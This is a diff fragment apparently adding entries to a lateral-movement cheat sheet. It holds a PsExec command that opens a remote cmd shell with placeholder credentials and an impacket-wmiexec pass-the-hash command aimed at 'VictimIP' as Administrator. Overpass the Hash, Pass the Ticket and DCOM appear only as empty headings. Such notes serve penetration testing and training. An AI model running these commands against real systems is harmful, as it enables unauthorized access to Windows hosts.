@@ -34,6 +34,21 @@ Enter-PSSession $winrm_session_number
 ## PsExec
 
 ```
+C:\path\to\PsExec64.exe -i  \\hostname -u somedomain\someuser -p somepass cmd
+> hostname
+> whoami
+```
+
+## Pass the Hash
 
 ```
+/usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:somelonghashstring Administrator:VictimIP
+```
+
+## Overpass the Hash
+
+## Pass the Ticket
+
+## DCOM
+
 
